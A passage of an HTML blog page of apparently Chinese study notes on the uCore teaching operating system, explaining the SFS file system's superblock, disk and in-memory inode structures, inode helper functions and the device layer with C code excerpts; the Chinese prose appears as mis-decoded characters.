title="æ–‡ä»¶ç³»ç»Ÿå¸ƒå±€"></a>æ–‡ä»¶ç³»ç»Ÿå¸ƒå±€</h4><p><img src="../../image/ucore/image-20220105200753016.png" alt="image-20220105200753016"></p><p>æ–‡ä»¶ç³»ç»Ÿé€šå¸¸ä¿å­˜åœ¨ç£ç›˜ä¸Šã€‚åœ¨æœ¬å®éªŒä¸­ï¼Œç¬¬ä¸‰ä¸ªç£ç›˜ï¼ˆå³disk0ï¼Œå‰ä¸¤ä¸ªç£ç›˜åˆ†åˆ«æ˜¯ ucore.img å’Œ swap.imgï¼‰ç”¨äºå­˜æ”¾ä¸€ä¸ªSFSæ–‡ä»¶ç³»ç»Ÿï¼ˆSimple Filesystemï¼‰ã€‚é€šå¸¸æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œç£ç›˜çš„ä½¿ç”¨æ˜¯ä»¥æ‰‡åŒºï¼ˆSectorï¼‰ä¸ºå•ä½çš„ï¼Œä½†æ˜¯ä¸ºäº†å®ç°ç®€ä¾¿ï¼ŒSFS ä¸­ä»¥ <strong>block</strong> ï¼ˆ4Kï¼Œä¸å†…å­˜ page å¤§å°ç›¸ç­‰ï¼‰ä¸ºåŸºæœ¬å•ä½ã€‚</p><p>ç¬¬0ä¸ªå—(4K)æ˜¯<strong>superblock</strong>ï¼Œå®ƒåŒ…å«äº†å…³äºæ–‡ä»¶ç³»ç»Ÿçš„æ‰€æœ‰å…³é”®å‚æ•°ï¼Œå½“è®¡ç®—æœºè¢«å¯åŠ¨æˆ–æ–‡ä»¶ç³»ç»Ÿè¢«é¦–æ¬¡æ¥è§¦æ—¶ï¼Œè¶…çº§å—çš„å†…å®¹å°±ä¼šè¢«è£…å…¥å†…å­˜ã€‚å…¶å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_super</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> magic;                                  <span class="hljs-comment">/* magic number, should be SFS_MAGIC */</span><br>    <span class="hljs-keyword">uint32_t</span> blocks;                                 <span class="hljs-comment">/* # of blocks in fs */</span><br>    <span class="hljs-keyword">uint32_t</span> unused_blocks;                         <span class="hljs-comment">/* # of unused blocks in fs */</span><br>    <span class="hljs-keyword">char</span> info[SFS_MAX_INFO_LEN + <span class="hljs-number">1</span>];                <span class="hljs-comment">/* infomation for sfs  */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><blockquote><p>magic numberå°±æ˜¯ä¸€ä¸²ç¥ç§˜è«æµ‹çš„æ•°å­—, è¿™é‡Œç”¨æ¥æ ‡è¯†SFSæ–‡ä»¶ç³»ç»Ÿ, å€¼ä¸º0x2f8dbe2a</p></blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯è™½ç„¶inodeçš„å¤§å°å°äºä¸€ä¸ªå—çš„å¤§å°ï¼ˆ4096Bï¼‰ï¼Œ<strong>ä½†ä¸ºäº†å®ç°ç®€å•ï¼Œæ¯ä¸ª inode éƒ½å ç”¨ä¸€ä¸ªå®Œæ•´çš„ blockã€‚</strong> </p><p>åœ¨sfs_fs.cæ–‡ä»¶ä¸­çš„<code>sfs_do_mount</code>å‡½æ•°ä¸­ï¼Œå®Œæˆäº†åŠ è½½ä½äºç¡¬ç›˜ä¸Šçš„SFSæ–‡ä»¶ç³»ç»Ÿçš„è¶…çº§å—superblockå’Œfreemapçš„å·¥ä½œã€‚è¿™æ ·ï¼Œåœ¨å†…å­˜ä¸­å°±æœ‰äº†SFSæ–‡ä»¶ç³»ç»Ÿçš„å…¨å±€ä¿¡æ¯ã€‚</p><h4 id="ç´¢å¼•èŠ‚ç‚¹"><a href="#ç´¢å¼•èŠ‚ç‚¹" class="headerlink" title="ç´¢å¼•èŠ‚ç‚¹"></a>ç´¢å¼•èŠ‚ç‚¹</h4><p>åœ¨<code>sfs</code>å±‚é¢ä¸Šï¼Œ<code>inode</code>ç»“æ„æ—¢å¯è¡¨ç¤ºæ–‡ä»¶<code>file</code>ã€ç›®å½•<code>dir</code>ï¼Œä¹Ÿå¯è¡¨ç¤ºè®¾å¤‡<code>device</code>ã€‚è€ŒåŒºåˆ†<code>inode</code>ç»“æ„çš„æ“ä½œæœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯å…¶<code>in_info</code>æˆå‘˜å˜é‡ï¼Œå¦ä¸€ç§æ˜¯è¯¥ç»“æ„çš„æˆå‘˜æŒ‡é’ˆ<code>in_ops</code>ã€‚ä»¥ä¸‹æ˜¯å‡½æ•°<code>sfs_get_ops</code>çš„æºç ï¼Œè¯¥å‡½æ•°è¿”å›æŸä¸ªå±æ€§ï¼ˆæ–‡ä»¶/ç›®å½•ï¼‰æ‰€å¯¹åº”çš„<code>inode</code>æ“ä½œï¼š</p><blockquote><p>æ³¨æ„ï¼Œè®¾ç½®inode_opsçš„æ“ä½œä¸æ­¢ä¸€å¤„ï¼Œä»¥ä¸‹ä»£ç åªä½œä¸ºç¤ºä¾‹ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sfs_get_ops - return function addr of fs_node_dirops/sfs_node_fileops</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> struct inode_ops *</span><br><span class="hljs-function"><span class="hljs-title">sfs_get_ops</span><span class="hljs-params">(<span class="hljs-keyword">uint16_t</span> type)</span> </span>&#123;<br>    <span class="hljs-keyword">switch</span> (type) &#123;<br>    <span class="hljs-keyword">case</span> SFS_TYPE_DIR:<br>        <span class="hljs-keyword">return</span> &amp;sfs_node_dirops;<br>    <span class="hljs-keyword">case</span> SFS_TYPE_FILE:<br>        <span class="hljs-keyword">return</span> &amp;sfs_node_fileops;<br>    &#125;<br>    panic(<span class="hljs-string">&quot;invalid file type %d.\n&quot;</span>, type);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å½“uCoreåˆ›å»ºä¸€ä¸ª<strong>ç”¨äºå­˜å‚¨æ–‡ä»¶/ç›®å½•</strong>çš„<code>inode</code>ç»“æ„ï¼ˆå³è¯¥<code>inode</code>ç»“æ„çš„<code>in_info</code>æˆå‘˜å˜é‡ä¸º<code>sfs_inode</code>ç±»å‹ï¼‰æ—¶ï¼Œç¨‹åºä¼šæ‰§è¡Œå‡½æ•°<code>sfs_create_inode</code>ã€‚è¯¥å‡½æ•°ä¼š<strong>å°†<code>inode</code>ç»“æ„ä¸­çš„<code>sfs_inode</code>æˆå‘˜ä¸ç£ç›˜å¯¹åº”ç»“ç‚¹<code>sfs_disk_inode</code>ç›¸å…³è”</strong>ï¼Œä»è€Œä½¿å¾—åªå‡­<code>inode</code>å³å¯æ“ä½œè¯¥ç»“ç‚¹ã€‚ </p><blockquote><p>æ¯”å¦‚åœ¨æ‰“å¼€æ–‡ä»¶çš„æ—¶å€™, éœ€è¦è°ƒç”¨<code>sfs_dirent_search_nolock</code>æŸ¥æ‰¾è·¯å¾„å¯¹åº”inode, å¦‚æœæ‰¾åˆ°äº†ä¼šè¿”å›inoç¼–å·, ç„¶åè°ƒç”¨<code>sfs_load_inode</code>æ ¹æ®inoå’Œsfsæ‰¾åˆ°å¯¹åº”inode, æŠŠå¯¹åº”<code>sfs_disk_inode</code>è¯»åˆ°å†…å­˜ä¸­, ç„¶åè°ƒç”¨**<code>sfs_create_inode</code>**, åˆå§‹åŒ–<code>inode</code>é‡Œçš„<code>sfs_inode</code>.</p></blockquote><blockquote><p>ç”¨äºæè¿°è®¾å¤‡<code>device</code>çš„<code>inode</code>ä¼šåœ¨å…¶ä»–å‡½æ•°ä¸­è¢«åˆå§‹åŒ–ï¼Œä¸ä¼šæ‰§è¡Œå‡½æ•°<code>sfs_create_inode</code></p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sfs_create_inode - alloc a inode in memroy, and init din/ino/dirty/reclian_count/sem fields in sfs_inode in inode</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">sfs_create_inode</span><span class="hljs-params">(struct sfs_fs *sfs, struct sfs_disk_inode *din, <span class="hljs-keyword">uint32_t</span> ino, struct inode **node_store)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">node</span>;</span><br>    <span class="hljs-keyword">if</span> ((node = alloc_inode(sfs_inode)) != <span class="hljs-literal">NULL</span>) &#123;<br>        vop_init(node, sfs_get_ops(din-&gt;type), info2fs(sfs, sfs));<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_inode</span> *<span class="hljs-title">sin</span> =</span> vop_info(node, sfs_inode);<br>        <span class="hljs-built_in">sin</span>-&gt;din = din, <span class="hljs-built_in">sin</span>-&gt;ino = ino, <span class="hljs-built_in">sin</span>-&gt;dirty = <span class="hljs-number">0</span>, <span class="hljs-built_in">sin</span>-&gt;reclaim_count = <span class="hljs-number">1</span>;<br>        sem_init(&amp;(<span class="hljs-built_in">sin</span>-&gt;sem), <span class="hljs-number">1</span>);<br>        *node_store = node;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_NO_MEM;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="ç£ç›˜ç´¢å¼•èŠ‚ç‚¹"><a href="#ç£ç›˜ç´¢å¼•èŠ‚ç‚¹" class="headerlink" title="ç£ç›˜ç´¢å¼•èŠ‚ç‚¹"></a>ç£ç›˜ç´¢å¼•èŠ‚ç‚¹</h5><p>å°±æ˜¯<code>sfs_disk_inode </code>, understandç»“æ„å›¾ä¸­æœ€åä¸€ä¸ªç»“æ„ä½“, <strong>ä¿å­˜åœ¨ç£ç›˜ä¸Š</strong>.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* inode (on disk) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_inode</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> size;                                  <span class="hljs-comment">/* size of the file (in bytes) */</span><br>    <span class="hljs-keyword">uint16_t</span> type;                                  <span class="hljs-comment">/* one of SYS_TYPE_* above */</span><br>    <span class="hljs-keyword">uint16_t</span> nlinks;                                <span class="hljs-comment">/* # of hard links to this file */</span><br>    <span class="hljs-keyword">uint32_t</span> blocks;                                <span class="hljs-comment">/* # of blocks */</span><br>    <span class="hljs-keyword">uint32_t</span> direct[SFS_NDIRECT];                   <span class="hljs-comment">/* direct blocks å­˜å‚¨çš„æ˜¯inoç¼–å·*/</span><br>    <span class="hljs-keyword">uint32_t</span> indirect;                              <span class="hljs-comment">/* indirect blocks */</span><br><span class="hljs-comment">//    uint32_t db_indirect;                           /* double indirect blocks */</span><br><span class="hljs-comment">//   unused</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>å¯¹äºæ–‡ä»¶, <u>ç´¢å¼•å€¼</u><strong>æŒ‡å‘çš„</strong>æ˜¯æ•°æ®å—.</p><p>å¯¹äºç›®å½•, <u>ç´¢å¼•å€¼</u><strong>æŒ‡å‘çš„</strong>æ˜¯ä¸‹é¢è¿™ä¸ªç»“æ„ä½“ã€‚æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* file entry (on disk) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_entry</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> ino;                                   <span class="hljs-comment">//ç´¢å¼•èŠ‚ç‚¹æ‰€å æ•°æ®å—ç´¢å¼•å€¼</span><br>    <span class="hljs-keyword">char</span> name[SFS_MAX_FNAME_LEN + <span class="hljs-number">1</span>];               <span class="hljs-comment">//æ–‡ä»¶å</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h5 id="å†…å­˜ç´¢å¼•èŠ‚ç‚¹"><a href="#å†…å­˜ç´¢å¼•èŠ‚ç‚¹" class="headerlink" title="å†…å­˜ç´¢å¼•èŠ‚ç‚¹"></a>å†…å­˜ç´¢å¼•èŠ‚ç‚¹</h5><p>å³<code>sfs_inode</code>.  éœ€è¦æ³¨æ„ï¼Œä¸€ä¸ªå†…å­˜inodeæ˜¯åœ¨æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åæ‰åˆ›å»ºçš„ï¼Œå¦‚æœå…³æœºåˆ™ç›¸å…³ä¿¡æ¯éƒ½ä¼šæ¶ˆå¤±ã€‚<br>è€Œç¡¬ç›˜inode(å³<code>sfs_disk_inode</code>)çš„å†…å®¹æ˜¯ä¿å­˜åœ¨ç¡¬ç›˜ä¸­çš„ï¼Œåªæ˜¯åœ¨è¿›ç¨‹éœ€è¦æ—¶æ‰è¢«è¯»å…¥åˆ°å†…å­˜ä¸­ï¼Œç”¨äºè®¿é—®æ–‡ä»¶æˆ–ç›®å½•çš„å…·ä½“å†…å®¹æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* inode for sfs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_inode</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_inode</span> *<span class="hljs-title">din</span>;</span>                     <span class="hljs-comment">/* on-disk inode ä¸€å¯¹ä¸€æŒ‡é’ˆ*/</span><br>    <span class="hljs-keyword">uint32_t</span> ino;                                   <span class="hljs-comment">/* inode number */</span><br>    <span class="hljs-keyword">bool</span> dirty;                                     <span class="hljs-comment">/* true if inode modified */</span><br>    <span class="hljs-keyword">int</span> reclaim_count;                              <span class="hljs-comment">/* kill inode if it hits zero */</span><br>    <span class="hljs-keyword">semaphore_t</span> sem;                                <span class="hljs-comment">/* semaphore for din */</span><br>    <span class="hljs-keyword">list_entry_t</span> inode_link;                        <span class="hljs-comment">/* entry for linked-list in sfs_fs */</span><br>    <span class="hljs-keyword">list_entry_t</span> hash_link;                         <span class="hljs-comment">/* entry for hash linked-list in sfs_fs */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>ä¸ºäº†æ–¹ä¾¿å®ç°ä¸Šé¢æåˆ°çš„å¤šçº§æ•°æ®çš„è®¿é—®ä»¥åŠç›®å½•ä¸­ entry çš„æ“ä½œï¼Œå¯¹ inode SFSå®ç°äº†ä¸€äº›<strong>è¾…åŠ©çš„å‡½æ•°</strong>ï¼š</p><ol><li><code>sfs_bmap_load_nolock</code>ï¼šå°†å¯¹åº” sfs_inode çš„ç¬¬ index ä¸ªç´¢å¼•æŒ‡å‘çš„ block çš„<strong>ç´¢å¼•å€¼</strong>å–å‡ºå­˜åˆ°ç›¸åº”çš„æŒ‡é’ˆæŒ‡å‘çš„å•å…ƒï¼ˆino_storeï¼‰ã€‚è¯¥å‡½æ•°åªæ¥å— index &lt;= inode-&gt;blocks çš„å‚æ•°ã€‚å½“ index == inode-&gt;blocks æ—¶ï¼Œè¯¥å‡½æ•°ç†è§£ä¸ºéœ€è¦ä¸º inode å¢é•¿ä¸€ä¸ª blockã€‚<strong>å¹¶æ ‡è®° inode ä¸º dirty</strong>ï¼ˆæ‰€æœ‰å¯¹ inode æ•°æ®çš„ä¿®æ”¹éƒ½è¦åšè¿™æ ·çš„æ“ä½œï¼Œè¿™æ ·ï¼Œå½“ inode ä¸å†ä½¿ç”¨çš„æ—¶å€™ï¼Œsfs èƒ½å¤Ÿä¿è¯ inode æ•°æ®èƒ½å¤Ÿè¢«å†™å›åˆ°ç£ç›˜ï¼‰ã€‚sfs_bmap_load_nolock è°ƒç”¨çš„ sfs_bmap_get_nolock æ¥å®Œæˆç›¸åº”çš„æ“ä½œ, åˆ†ä¸ºç›´æ¥ç´¢å¼•å’Œé—´æ¥ç´¢å¼•ä¸¤ç§æƒ…å†µ, <u>å®Œæˆinoçš„loadæ“ä½œ</u>.ï¼ˆsfs_bmap_get_nolock åªç”± sfs_bmap_load_nolock è°ƒç”¨ï¼‰</li><li><code>sfs_bmap_truncate_nolock</code>ï¼šå°†å¤šçº§æ•°æ®ç´¢å¼•è¡¨çš„æœ€åä¸€ä¸ª entry é‡Šæ”¾æ‰ã€‚<strong>ä»–å¯ä»¥è®¤ä¸ºæ˜¯ sfs_bmap_load_nolock ä¸­ï¼Œindex == inode-&gt;blocks çš„é€†æ“ä½œ</strong>(æ£€æµ‹åˆ°æ—¶å°±ä¼šä»freemapä¸­allocä¸€ä¸ª)ã€‚å½“ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•è¢«åˆ é™¤æ—¶ï¼Œsfs ä¼šå¾ªç¯è°ƒç”¨è¯¥å‡½æ•°ç›´åˆ° inode-&gt;blocks å‡ä¸º 0ï¼Œé‡Šæ”¾æ‰€æœ‰çš„æ•°æ®é¡µã€‚å‡½æ•°é€šè¿‡ sfs_bmap_free_nolock æ¥å®ç°ï¼Œä»–åº”è¯¥æ˜¯ sfs_bmap_get_nolock çš„é€†æ“ä½œã€‚å’Œ sfs_bmap_get_nolock ä¸€æ ·ï¼Œè°ƒç”¨ sfs_bmap_free_nolock ä¹Ÿè¦æ ¼å¤–å°å¿ƒã€‚</li><li><code>sfs_dirent_read_nolock</code>ï¼šå°†ç›®å½•çš„ç¬¬ slot ä¸ª entry è¯»å–åˆ°æŒ‡å®šçš„å†…å­˜ç©ºé—´ã€‚ä»–é€šè¿‡ä¸Šé¢æåˆ°çš„å‡½æ•°æ¥å®Œæˆã€‚</li><li><code>sfs_dirent_search_nolock</code>ï¼šæ˜¯å¸¸ç”¨çš„æŸ¥æ‰¾å‡½æ•°ã€‚ä»–åœ¨ç›®å½•ä¸‹æŸ¥æ‰¾ nameï¼Œå¹¶ä¸”è¿”å›ç›¸åº”çš„æœç´¢ç»“æœï¼ˆæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ï¼‰çš„ inode çš„ç¼–å·ï¼ˆ<strong>ä¹Ÿæ˜¯ç£ç›˜ç¼–å·</strong>ï¼‰ï¼Œå’Œç›¸åº”çš„ entry åœ¨è¯¥ç›®å½•çš„ index ç¼–å·ä»¥åŠç›®å½•ä¸‹çš„æ•°æ®é¡µæ˜¯å¦æœ‰ç©ºé—²çš„ entryã€‚ï¼ˆSFS å®ç°é‡Œæ–‡ä»¶çš„æ•°æ®é¡µæ˜¯è¿ç»­çš„ï¼Œä¸å­˜åœ¨ä»»ä½•ç©ºæ´ï¼›è€Œå¯¹äºç›®å½•ï¼Œæ•°æ®é¡µä¸æ˜¯è¿ç»­çš„ï¼Œå½“æŸä¸ª entry åˆ é™¤çš„æ—¶å€™ï¼ŒSFS é€šè¿‡è®¾ç½® entry-&gt;ino ä¸º0å°†è¯¥ entry æ‰€åœ¨çš„ block æ ‡è®°ä¸º freeï¼Œåœ¨éœ€è¦æ·»åŠ æ–° entry çš„æ—¶å€™ï¼ŒSFS ä¼˜å…ˆä½¿ç”¨è¿™äº› free çš„ entryï¼Œå…¶æ¬¡æ‰ä¼šå»åœ¨æ•°æ®é¡µå°¾è¿½åŠ æ–°çš„ entry.)</li></ol><blockquote><p> ä»ä¸‹åˆ°ä¸Šè¡¨æ˜äº†ä»–ä»¬ä¹‹é—´çš„åŒ…å«å…³ç³». æ³¨æ„åˆ°<code>dirent</code>æ˜¯æŒ‡<code>directory entry</code>, æœ€åä¸¤ä¸ªå‡½æ•°ä¸“ç”¨äºç›®å½•</p></blockquote><p><strong>æ³¨æ„ï¼Œè¿™äº›åç¼€ä¸º nolock çš„å‡½æ•°ï¼Œåªèƒ½åœ¨å·²ç»è·å¾—ç›¸åº” inode çš„semaphoreæ‰èƒ½è°ƒç”¨ã€‚</strong> </p><hr><h4 id="Inodeçš„æ–‡ä»¶-ç›®å½•æ“ä½œå‡½æ•°"><a href="#Inodeçš„æ–‡ä»¶-ç›®å½•æ“ä½œå‡½æ•°" class="headerlink" title="Inodeçš„æ–‡ä»¶,ç›®å½•æ“ä½œå‡½æ•°"></a>Inodeçš„æ–‡ä»¶,ç›®å½•æ“ä½œå‡½æ•°</h4><p>è¿™äº›æ“ä½œå‡½æ•°ä½¿ç”¨ç»“æ„ä½“+å‡½æ•°æŒ‡é’ˆæ¥å®šä¹‰, åœ¨inodeç»“æ„ä½“ä¸­è¢«èµ‹å€¼.</p><ul><li>é¦–å…ˆæ˜¯æ–‡ä»¶æ“ä½œå‡½æ•°: </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_fileops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>sfs_openfileä¸ç”¨åšä»€ä¹ˆäº‹ï¼›sfs_closeéœ€è¦æŠŠå¯¹æ–‡ä»¶çš„ä¿®æ”¹å†…å®¹å†™å›åˆ°ç¡¬ç›˜ä¸Šï¼Œè¿™æ ·ç¡®ä¿ç¡¬ç›˜ä¸Šçš„æ–‡ä»¶å†…å®¹æ•°æ®æ˜¯æœ€æ–°çš„ï¼›sfs_readå’Œsfs_writeå‡½æ•°éƒ½è°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°sfs_ioï¼Œå¹¶æœ€ç»ˆé€šè¿‡è®¿é—®ç¡¬ç›˜é©±åŠ¨æ¥å®Œæˆå¯¹æ–‡ä»¶å†…å®¹æ•°æ®çš„è¯»å†™ã€‚</p><ul><li>ç„¶åæ˜¯ç›®å½•æ“ä½œå‡½æ•°: </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_dirops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>å¯¹äºç›®å½•æ“ä½œè€Œè¨€ï¼Œç”±äºç›®å½•ä¹Ÿæ˜¯ä¸€ç§æ–‡ä»¶ï¼Œæ‰€ä»¥sfs_opendirã€sys_closeå¯¹åº”æˆ·è¿›ç¨‹å‘å‡ºçš„openã€closeå‡½æ•°ã€‚ç›¸å¯¹äºsfs_openï¼Œsfs_opendiråªæ˜¯å®Œæˆä¸€äº›openå‡½æ•°ä¼ é€’çš„å‚æ•°åˆ¤æ–­ï¼Œæ²¡åšå…¶ä»–æ›´å¤šçš„äº‹æƒ…ã€‚ç›®å½•çš„closeæ“ä½œä¸æ–‡ä»¶çš„closeæ“ä½œå®Œå…¨ä¸€è‡´ã€‚ç”±äºç›®å½•çš„å†…å®¹æ•°æ®ä¸æ–‡ä»¶çš„å†…å®¹æ•°æ®ä¸åŒï¼Œæ‰€ä»¥è¯»å‡ºç›®å½•çš„å†…å®¹æ•°æ®çš„å‡½æ•°æ˜¯sfs_getdirentryï¼Œå…¶ä¸»è¦å·¥ä½œæ˜¯è·å–ç›®å½•ä¸‹çš„æ–‡ä»¶inodeä¿¡æ¯ã€‚</p><h3 id="5-deviceå±‚"><a href="#5-deviceå±‚" class="headerlink" title="5.deviceå±‚"></a>5.deviceå±‚</h3><blockquote><p>ç›®å‰å®ç°äº†stdinè®¾å¤‡æ–‡ä»¶æ–‡ä»¶ã€stdoutè®¾å¤‡æ–‡ä»¶ã€disk0è®¾å¤‡ã€‚stdinè®¾å¤‡å°±æ˜¯é”®ç›˜ï¼Œstdoutè®¾å¤‡å°±æ˜¯CONSOLEï¼ˆä¸²å£ã€å¹¶å£å’Œæ–‡æœ¬æ˜¾ç¤ºå™¨ï¼‰ï¼Œè€Œdisk0è®¾å¤‡æ˜¯æ‰¿è½½SFSæ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜è®¾å¤‡ã€‚(æ— æƒ…çš„å¤åˆ¶æœºå™¨)</p></blockquote><p>ä¸ºäº†è¡¨ç¤ºä¸€ä¸ªè®¾å¤‡ï¼Œéœ€è¦æœ‰å¯¹åº”çš„æ•°æ®ç»“æ„ï¼Œucoreä¸ºæ­¤å®šä¹‰äº†struct deviceï¼Œå…¶æè¿°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> &#123;</span><br>    <span class="hljs-keyword">size_t</span> d_blocks;    <span class="hljs-comment">//è®¾å¤‡å ç”¨çš„æ•°æ®å—ä¸ªæ•°            </span><br>    <span class="hljs-keyword">size_t</span> d_blocksize;  <span class="hljs-comment">//æ•°æ®å—çš„å¤§å°</span><br>    <span class="hljs-keyword">int</span> (*d_open)(struct device *dev, <span class="hljs-keyword">uint32_t</span> open_flags);  <span class="hljs-comment">//æ‰“å¼€è®¾å¤‡çš„å‡½æ•°æŒ‡é’ˆ</span><br>    <span class="hljs-keyword">int</span> (*d_close)(struct device *dev); <span class="hljs-comment">//å…³é—­è®¾å¤‡çš„å‡½æ•°æŒ‡é’ˆ</span><br>    <span class="hljs-keyword">int</span> (*d_io)(struct device *dev, struct iobuf *iob, <span class="hljs-keyword">bool</span> write); <span class="hljs-comment">//è¯»å†™è®¾å¤‡çš„å‡½æ•°æŒ‡é’ˆ</span><br>    <span class="hljs-keyword">int</span> (*d_ioctl)(struct device *dev, <span class="hljs-keyword">int</span> op, <span class="hljs-keyword">void</span> *data); <span class="hljs-comment">//ç”¨ioctlæ–¹å¼æ§åˆ¶è®¾å¤‡çš„å‡½æ•°æŒ‡é’ˆ</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>è¿™ä¸ªæ•°æ®ç»“æ„èƒ½å¤Ÿæ”¯æŒå¯¹å—è®¾å¤‡ï¼ˆæ¯”å¦‚ç£ç›˜ï¼‰ã€å­—ç¬¦è®¾å¤‡ï¼ˆæ¯”å¦‚é”®ç›˜ã€ä¸²å£ï¼‰çš„è¡¨ç¤ºï¼Œå®Œæˆå¯¹è®¾å¤‡çš„åŸºæœ¬æ“ä½œã€‚ucoreè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿä¸ºäº†æŠŠè¿™äº›è®¾å¤‡é“¾æ¥åœ¨ä¸€èµ·ï¼Œè¿˜å®šä¹‰äº†ä¸€ä¸ªè®¾å¤‡é“¾è¡¨ï¼Œå³åŒå‘é“¾è¡¨<strong>vdev_list</strong>ï¼Œè¿™æ 